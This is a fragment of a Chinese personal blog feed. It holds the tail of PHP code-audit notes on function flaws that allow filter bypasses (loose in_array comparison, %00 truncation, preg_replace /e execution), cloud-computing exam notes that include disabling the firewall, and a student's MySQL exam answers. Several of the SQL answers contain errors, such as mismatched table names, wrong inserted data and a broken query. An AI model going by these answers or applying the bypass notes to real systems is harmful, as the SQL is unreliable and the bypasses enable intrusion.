class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">数组绕过<br>strpos 如果传入数组，会返回<span class="hljs-literal">NULL</span><br>换行绕过<br>strpos 我们可以利用换行进行绕过（%<span class="hljs-number">0</span>a)<br></code></pre></td></tr></table></figure><h3 id="0x05-in-array函数缺陷"><a href="#0x05-in-array函数缺陷" class="headerlink" title="0x05 in_array函数缺陷"></a>0x05 in_array函数缺陷</h3><p>in_array — 检查数组中是否存在某个值</p><p>in_array 函数默认采用 <strong>宽松</strong> 比较，即不比较类型，只比较值是否相等。</p><p>needle:  待搜索的值。(如果 <code>needle</code> 是字符串，则比较是区分大小写的。)</p><p>haystack:带搜索的数组。</p><p>strict:如果第三个参数 <code>strict</code> 的值为     <strong><code>true</code></strong> 则 <strong>in_array()</strong> 函数还会检查     <code>needle</code> 的<a href="https://www.php.net/manual/zh/language.types.php">类型</a>是否和     <code>haystack</code> 中的相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">in_array(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>也就是说在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p><p>也就是说，in_array()函数检测上传文件时候，如果未将第三个参数设置为true，从而导致攻击者构造文件名绕过服务端的检测。</p><p>文章参考于<a href="https://www.cnblogs.com/nice0e3/p/15380627.html">PHP审计之in_array函数缺陷绕过</a></p><h3 id="0x06-preg-match-函数缺陷"><a href="#0x06-preg-match-函数缺陷" class="headerlink" title="0x06 preg_match()函数缺陷"></a>0x06 preg_match()函数缺陷</h3><p><strong>当被匹配的数据为数组的时候回返回false值。</strong></p><h3 id="0x07-Preg-replace-函数缺陷"><a href="#0x07-Preg-replace-函数缺陷" class="headerlink" title="0x07 Preg_replace()函数缺陷"></a>0x07 Preg_replace()函数缺陷</h3><p><strong>Preg_replcae在存在/e模式的时候会产生代码执行漏洞</strong></p><h3 id="0x08-str-replace-函数缺陷"><a href="#0x08-str-replace-函数缺陷" class="headerlink" title="0x08 str_replace()函数缺陷"></a>0x08 str_replace()函数缺陷</h3><h3 id="0x09-isset-函数缺陷"><a href="#0x09-isset-函数缺陷" class="headerlink" title="0x09 isset()函数缺陷"></a>0x09 isset()函数缺陷</h3><p><strong>isset()函数只检查变量是否存在，不检查值。</strong></p><h3 id="0x10-strcmp函数缺陷"><a href="#0x10-strcmp函数缺陷" class="headerlink" title="0x10 strcmp函数缺陷"></a>0x10 strcmp函数缺陷</h3><p><strong>strcmp函数无法比较数组，可以使用数组绕过。</strong></p><h3 id="0x11-file-get-contents-函数缺陷"><a href="#0x11-file-get-contents-函数缺陷" class="headerlink" title="0x11 file_get_contents() 函数缺陷"></a>0x11 file_get_contents() 函数缺陷</h3><p><strong>file_get_contents() 函数把整个文件读入一个字符串中，如果文件不存在，则函数返回flase(0)。</strong></p><h3 id="0x12-is-numeric-函数缺陷"><a href="#0x12-is-numeric-函数缺陷" class="headerlink" title="0x12 is_numeric()函数缺陷"></a>0x12 is_numeric()函数缺陷</h3><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p><p>Is_numeric函数在对末尾含有%20的整数进行判断时会返回false。</p><h3 id="0x13-ereg-函数缺陷"><a href="#0x13-ereg-函数缺陷" class="headerlink" title="0x13 ereg()函数缺陷"></a>0x13 ereg()函数缺陷</h3><p>Ereg函数用来对字符串中指定的字符进行匹配，返回True或False值。</p><p><strong>当字符串中存在%00的时候，ereg将不会匹配%00后面的字符串，进行截断，从而进行绕过。</strong></p><h3 id="0x14-Call-user-func-函数缺陷"><a href="#0x14-Call-user-func-函数缺陷" class="headerlink" title="0x14 Call_user_func()函数缺陷"></a>0x14 Call_user_func()函数缺陷</h3><p><strong>函数将第一个参数作为调用的函数，其余参数为函数的传入参数，当两个值为可控内容时会产生命令执行漏洞。</strong></p><h3 id="0x15-assert-函数-php-lt-7"><a href="#0x15-assert-函数-php-lt-7" class="headerlink" title="0x15 assert()函数(php&lt;7)"></a>0x15 assert()函数(php&lt;7)</h3><p><strong>将字符串以php代码来执行。</strong></p><p>最后收藏一个代码审计的练习的git项目：<a href="https://github.com/hongriSec/PHP-Audit-Labs">红日安全代码审计</a></p>]]></content>
    
    
    <categories>
      
      <category>小迪安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 - php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cloud-computing</title>
    <link href="/2022/01/03/cloud-computing/"/>
    <url>/2022/01/03/cloud-computing/</url>
    
    <content type="html"><![CDATA[<figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><pre><code class="hljs tex">解答题<br>1.云计算的基本概念及优点<br>2.容器云的概念：4大核心概念<br>3.虚拟化技术的概念、分类、类型<br>4.什么是分布式系统、分类<br>6.云计算安全<br>7.第九章<br>综合题<br>第一题：<br>1.基础环境配置：yum源<br>2.网络配置（配置文件）<br>3.安全机制的关闭<br>第二题：<br>流程控制语句<br></code></pre></td></tr></table></figure><h3 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h3><h4 id="1-云计算的基本概念及优点"><a href="#1-云计算的基本概念及优点" class="headerlink" title="1.云计算的基本概念及优点"></a>1.云计算的基本概念及优点</h4><p><strong>概念</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">云计算是一种按使用量付费的模式，这种模式提供可用的、便捷的、按需的网络访问，进入可配置的计算资源共享池（资源包括网络、服务器、存储、应用软件、服务），只需投入很少的管理工作，或与服务供应商进行很少的交互，这些资源就能够被快速提供。<br></code></pre></td></tr></table></figure><p><strong>优点</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">1.低廉的成本<br>通过云平台的自动化运营技术，大幅降低了对运维人员的需求，一个运维人员可以管理数千台甚至上万台的IT设备，同时利用云平台中的虚拟化技术，对机房基础设施进行优化改造，降低机房的能耗，减少能源成本与场地成本。<br><br>2.敏捷快速<br>利用云计算平台，将IT基础设施直接由云服务供应商直接提供，节省了大量设备采购、场地选用等的时间和资金成本，加速了业务的上线速度。<br><br>3.扩展性好<br>通过云计算的弹性计算服务，可以做到根据用户访问量自动申请资源，在突发访问量到来之前，弹性计算服务会自动添加业务系统所需的软、硬件资源，解决业务突发性的并发访问的问题，使企业的业务系统在大流量的并发访问中做到收放自如的状态。<br></code></pre></td></tr></table></figure><h4 id="2-容器云的概念：4大核心概念"><a href="#2-容器云的概念：4大核心概念" class="headerlink" title="2.容器云的概念：4大核心概念"></a>2.容器云的概念：4大核心概念</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tex">镜像:Docker镜像（ Image）类似于虚拟机镜像， 可以将它理解为一个面向Docker引擎的只读模板， 包含了文件系统。<br><br>容器:容器是从镜像创建的应用运行实例。可以将其启动、开始、停止、删除，而这些容器都是彼此相互隔离的、互不可见的。<br><br>仓库:docker仓库类似于代码仓库，它是docker集中存放镜像文件的场所。<br><br>注册服务器:仓库注册服务器是存放仓库的地方，其上往往存放着多个仓库。<br></code></pre></td></tr></table></figure><h4 id="3-虚拟化技术的概念、分类、类型"><a href="#3-虚拟化技术的概念、分类、类型" class="headerlink" title="3.虚拟化技术的概念、分类、类型"></a>3.虚拟化技术的概念、分类、类型</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>概念<br>从广义上来说，就是通过用映射或抽象的方式屏蔽物理设备复杂性，在其上层增加一个管理层面，统一管理、调配这些物理资源，使之更易于透明控制，有效简化基础设施的建设和管理，增加IT资源如服务器、网络和存储等物理资源的利用率和使用效益。<br><br><span class="hljs-params">#</span>分类<br>根据虚拟化使用目的、应用领域和范围，可以有多种虚拟化类型，分别对各种资源实现虚拟化管理。<br><br><span class="hljs-params">#</span>类型<br>从主机系统虚拟化来划分，主要有寄居虚拟化、裸金属虚拟化、操作系统虚拟化、函数库虚拟化等类型。<br></code></pre></td></tr></table></figure><img src="/2022/01/03/cloud-computing/image-20220103200121607.png" class=""><img src="/2022/01/03/cloud-computing/image-20220103200142238.png" class=""><h4 id="4-什么是分布式系统、分类、优点"><a href="#4-什么是分布式系统、分类、优点" class="headerlink" title="4.什么是分布式系统、分类、优点"></a>4.什么是分布式系统、分类、优点</h4><p><strong>什么是分布式系统</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">分布式系统由多个业务节点组成，每个节点可以由廉价的终端或昂贵的服务器组成，构成一个独立的运算单元，它们分散在不同的地理位置，基于通信网络互联和分布式软件系统来执行任务。<br></code></pre></td></tr></table></figure><p><strong>分类</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">分布式系统根据网络的体系结构分为总线型和网络型；<br>根据系统架构分为分布式存储和分布式计算。<br></code></pre></td></tr></table></figure><p><strong>优点</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">（1）一致性。<br>即数据的一致性，关联数据之间的逻辑关系是否正确和完整，无论对数据怎样操作，都要保持数据的完整性和可用性，没有脏数据产生。<br><br>（2）可用性。<br>用户发出的各种请求，在服务器端能及时作出正确的响应，而不是错误的或是没有响应。<br><br>（3）容错性。<br>当一个节点出现故障时，系统中其它节点能够提供正常的服务，并对该节点进行删除和增加操作。<br></code></pre></td></tr></table></figure><h4 id="6-云计算安全"><a href="#6-云计算安全" class="headerlink" title="6.云计算安全"></a>6.云计算安全</h4><h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><h4 id="1-基础环境配置：yum源"><a href="#1-基础环境配置：yum源" class="headerlink" title="1.基础环境配置：yum源"></a>1.基础环境配置：yum源</h4><p>进入yum源配置文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /etc/yum.repos.d/<br></code></pre></td></tr></table></figure><p>编辑yum源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi local.repo<br></code></pre></td></tr></table></figure><p>输入以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[local]<br>name=local<br>baseurl=file:///opt/centos<br>gpgcheck=0<br>enabled=1<br></code></pre></td></tr></table></figure><p>创建挂载文件和目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p /media/cdrom<br>mount /dev/cdrom /media/cdrom<br></code></pre></td></tr></table></figure><p>设置永久挂载(可以不设置)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/fstab<br><span class="hljs-meta">#</span><span class="bash">输入以下内容</span><br>/dev/cdrom /media/cdrom iso9660 defaults 0 0<br></code></pre></td></tr></table></figure><h4 id="2-网络配置（配置文件）"><a href="#2-网络配置（配置文件）" class="headerlink" title="2.网络配置（配置文件）"></a>2.网络配置（配置文件）</h4><p>#编辑网卡配置文件(这里以ens33网卡为例)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/sysconfig/network-scripts/ifcfg-ens33<br></code></pre></td></tr></table></figure><p>修改成以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">设置网卡引导协议为静态</span><br>BOOTPROTO=static<br><span class="hljs-meta">#</span><span class="bash">设置网卡启动方式为开机启动</span><br>ONBOOT=yes<br><span class="hljs-meta">#</span><span class="bash">ip地址</span><br>IPADDR=192.168.1.2<br><span class="hljs-meta">#</span><span class="bash">ip网关</span><br>GATEWAY=192.168.1.1<br><span class="hljs-meta">#</span><span class="bash">ip子网掩码</span><br>NETMASK=255.255.255.0<br><span class="hljs-meta">#</span><span class="bash">DNS服务</span><br>DNS=8.8.8.8<br></code></pre></td></tr></table></figure><p>修改后输入以下命令进行重启网络设置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart network<br></code></pre></td></tr></table></figure><h4 id="3-安全机制的关闭"><a href="#3-安全机制的关闭" class="headerlink" title="3.安全机制的关闭"></a>3.安全机制的关闭</h4><p>在终端下输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">iptables规则</span><br>iptables -F<br>iptables -X<br>iptables -Z<br>iptables--save<br><span class="hljs-meta">#</span><span class="bash">防火墙</span><br>systemctl stop firewalld<br><span class="hljs-meta">#</span><span class="bash">Selinux规则</span><br>getenforce<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>云计算</category>
      
    </categories>
    
    
    <tags>
      
      <tag>云计算</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql-exam</title>
    <link href="/2021/12/29/mysql-exam/"/>
    <url>/2021/12/29/mysql-exam/</url>
    
    <content type="html"><![CDATA[<h3 id="1、在数据库game下建表，注意满足如下要求：（20分）"><a href="#1、在数据库game下建表，注意满足如下要求：（20分）" class="headerlink" title="1、在数据库game下建表，注意满足如下要求：（20分）"></a>1、在数据库game下建表，注意满足如下要求：（20分）</h3><p>1）定义各个表的主外健约束。<br>2）运动员的姓名和所属系别不能为空值。<br>3）积分要么为空值，要么为6，4，2，0。分别代表第一、二、三名和其他名次的积分</p><p>答：</p><p>先创建数据库game</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs mysql">create database game;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229144336734.png" class="" title="image-20211229144336734"><p>使用数据库game</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use game;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229144429855.png" class="" title="image-20211229144429855"><p>接下来开始创建一下的几张表：信息表gameinfo、运动员表sporter、项目表item和成绩表grade。</p><p>创建运动会信息表gameinfo</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table gameinfo(<br>Gameid int primary key,<br>Gamename varchar(30) not null,<br>School varchar(20),<br>Gamedate date,<br>Count int check(count&gt;0),<br>charge decimal(7,2) check(charge&gt;0)<br>);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229150108562.png" class="" title="image-20211229150108562"><p>创建运动员表sporter</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table sporter(<br>sporterid int primary key ,<br>name varchar(10) not null ,<br>sex varchar(2) ,<br>department varchar(15) not null<br>);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229150950167.png" class="" title="image-20211229150950167"><p>创建项目表item</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table item(<br>itemid int primary key,<br>itemname varchar(20),<br>location varchar(20)<br>);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229151305171.png" class="" title="image-20211229151305171"><p>创建成绩表grade</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table gradel(<br>id int,<br>Itemid int,<br>Mark int,<br>constraint fk_itemid<br>foreign key( itemid) references item( itemid),<br>constraint mark_ck check ( mark in( 6,4,2,0))<br>);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229151722746.png" class="" title="image-20211229151722746"><h3 id="2、-向数据库game的表中插入如下数据：（15）"><a href="#2、-向数据库game的表中插入如下数据：（15）" class="headerlink" title="2、 向数据库game的表中插入如下数据：（15）"></a>2、 向数据库game的表中插入如下数据：（15）</h3><p>运动会信息表gameinfo</p><p>(101,秋季运动会，工业大学，‘2008-8-8’，1000，12300.50)</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into gameinfo (Gameid,Gamename,School,Gamedate,Count,charge)<br>VALUES<br>(101,&#x27;秋季运动会&#x27;,&#x27;工业大学&#x27;,&#x27;2008-08-08&#x27;,1000,12300.50);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229153710793.png" class="" title="image-20211229153710793"><p>运动员表sporter(</p><p>1001,李明，男，计算机系</p><p>1002,张三，男，数学系</p><p>1003,李四，男，计算机系</p><p>1004,王二，男，物理系</p><p>1005,李娜，女，心理系</p><p>1006,孙丽，女，数学系）</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into sporter(sporterid,name,sex,department)<br>values<br>(1001,&#x27;李明&#x27;,&#x27;男&#x27;,&#x27;计算机&#x27;);<br>insert into sporter(sporterid,name,sex,department)<br>values <br> (1002,&#x27;张三&#x27;,&#x27;男&#x27;,&#x27;数学系&#x27;);<br>insert into sporter(sporterid,name,sex,department)<br> values <br> (1003,&#x27;李四&#x27;,&#x27;男&#x27;,&#x27;计算机&#x27;);<br>insert into sporter(sporterid,name,sex,department)<br> values <br> (1004,&#x27;王二&#x27;,&#x27;男&#x27;,&#x27;计算机&#x27;);<br> insert into sporter(sporterid,name,sex,department)<br> values <br> (1005,&#x27;李娜&#x27;,&#x27;男&#x27;,&#x27;计算机&#x27;);<br>insert into sporter(sporterid,name,sex,department)<br>values <br>(1006,&#x27;孙丽&#x27;,&#x27;男&#x27;,&#x27;计算机&#x27;);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229155243605.png" class="" title="image-20211229155243605"><img src="/2021/12/29/mysql-exam/image-20211229161035062.png" class="" title="image-20211229161035062"><p>项目表item(</p><p>001,男子五千米，一操场</p><p>002,男子标枪，一操场</p><p>003,男子跳远，二操场</p><p>004,女子跳高，二操场</p><p>005,女子三千米，三操场）</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into item(itemid,itemname,location)<br>values<br>(&#x27;001&#x27;,&#x27;男子五千米&#x27;,&#x27;一操场&#x27;);<br>insert into item(itemid,itemname,location)<br>values<br>(&#x27;002&#x27;,&#x27;男子标枪&#x27;,&#x27;一操场&#x27;);<br>insert into item(itemid,itemname,location)<br>values<br>(&#x27;003&#x27;,&#x27;男子跳远&#x27;,&#x27;一操场&#x27;);<br>insert into item(itemid,itemname,location)<br>values<br>(&#x27;004&#x27;,&#x27;女子跳高&#x27;,&#x27;二操场&#x27;);<br>insert into item(itemid,itemname,location)<br>values<br>(&#x27;005&#x27;,&#x27;女子三千米&#x27;,&#x27;三操场&#x27;);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229160001399.png" class="" title="image-20211229160001399"><img src="/2021/12/29/mysql-exam/image-20211229161013493.png" class="" title="image-20211229161013493"><p>成绩表（</p><p>1001，001,6</p><p>1002，001,4</p><p>1003，001,2</p><p>1004，001,0</p><p>1001，003,4</p><p>1002，003,6</p><p>1004，003,2</p><p>1005，004,6</p><p>1006，004,4)</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into grade(id,Itemid,Mark)<br>values (1001,&#x27;001&#x27;,6);<br>insert into grade(id,Itemid,Mark)<br>values (1002,&#x27;001&#x27;,4);<br>insert into grade(id,Itemid,Mark)<br>values (1003,&#x27;001&#x27;,2);<br>insert into grade(id,Itemid,Mark)<br>values (1004,&#x27;001&#x27;,0);<br>insert into grade(id,Itemid,Mark)<br>values (1001,&#x27;003&#x27;,4);<br>insert into grade(id,Itemid,Mark)<br>values (1002,&#x27;003&#x27;,6);<br>insert into grade(id,Itemid,Mark)<br>values (1004,&#x27;003&#x27;,2);<br>insert into grade(id,Itemid,Mark)<br>values (1005,&#x27;004&#x27;,6);<br>insert into grade(id,Itemid,Mark)<br>values (1006,&#x27;004&#x27;,4);<br><br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229160906699.png" class="" title="image-20211229160906699"><img src="/2021/12/29/mysql-exam/image-20211229160949929.png" class="" title="image-20211229160949929"><h3 id="3、-完成如下查询操作。（60分）"><a href="#3、-完成如下查询操作。（60分）" class="headerlink" title="3、 完成如下查询操作。（60分）"></a>3、 完成如下查询操作。（60分）</h3><p>（1） 查询运动会信息表以文字形式显示运动会的信息，例如：工业大学秋季运动会在2008</p><p>年8月8日举行，参加人数1000人，赛会预计费用12300.50元。（concat）</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">不会<br></code></pre></td></tr></table></figure><p>（2） 由于客观原因，参赛人数减少20%，费用缩减为原来的90%，请更改运动会信息表。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update gameinfo set count=count*(1-0.2),charge=charge*0.9;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229162043519.png" class="" title="image-20211229162043519"><p>（3） 1006号运动员的信息更改为孙梦，外语系。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update sporter set name=&#x27;孙梦&#x27;,department=&#x27;外语系&#x27; where sporterid=1006;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229162322725.png" class="" title="image-20211229162322725"><p>验证一下是否更改成功，发现更改成功。</p><img src="/2021/12/29/mysql-exam/image-20211229162445708.png" class="" title="image-20211229162445708"><p>（4） 计算参加运动会的男女运动员共多少人。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sex, count(*) from sporter group by sex;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229162654572.png" class="" title="image-20211229162654572"><p>（5） 查出姓李的运动员，显示他们的姓名和所在的系别。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select name,department from sporter where name like &#x27;李%&#x27;;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229162837775.png" class="" title="image-20211229162837775"><p>（6） 求出目前总积分最高的系别及其积分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select s.department, sum(g.mark) from sporter s, grade g where s.sporterid=g.id group by s.department;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229163115412.png" class="" title="image-20211229163115412"><p>（7） 找出在一操场进行比赛的各项目名称及其冠军的姓名</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select s.name,i.itemname from sporter s,item i, grade g where i.itemid=g.itemid and g.id=s.sporterid and g.mark=6 and i.location=&#x27;一操场&#x27;;<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229163345652.png" class="" title="image-20211229163345652"><p>（8） 找出参加了张三所参加的所有项目的其他同学的姓名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select s.name，s.sex,s.department ,i.itemname from sporter s， item i ,grade where i.itemid=g.itemid and g.id=s.sporterid and itemname =(select i.itemname fromsporter s, item i，gradel g where i.itemid=g.itemid and g.id=s. sporterid and s. name=&#x27;张三&#x27;);<br></code></pre></td></tr></table></figure><p>（9） 经查张三因为使用了违禁药品，其成绩都记0分，请在数据库中作出相应修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update grade set mark=0 where id=(select sporterid from sporter where name=&#x27;张三&#x27;);<br></code></pre></td></tr></table></figure><p>截图如下：</p><img src="/2021/12/29/mysql-exam/image-20211229163804465.png" class="" title="image-20211229163804465"><p>（10） 经组委会协商，需要删除女子跳高比赛项目。</p><p>命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 